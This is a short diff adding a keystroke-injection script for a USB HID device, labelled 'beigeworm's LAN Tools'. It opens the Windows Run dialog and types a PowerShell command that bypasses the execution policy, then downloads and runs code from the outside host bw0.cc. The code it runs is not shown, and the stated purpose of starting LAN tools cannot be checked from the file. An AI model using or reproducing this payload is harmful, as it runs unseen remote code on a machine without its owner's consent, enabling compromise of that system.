@@ -1,0 +1,12 @@
+REM Title: beigeworm's LAN Tools
+REM Author: @beigeworm
+REM Description: Start up a HTTP server and run a selection of Local Area Network Tools using Powershell.
+REM NOTE - This script will need Admin privileges to run properly.
+
+REM open powershell
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -Ep Bypass -C iex (irm bw0.cc/lant)
+ENTER
+
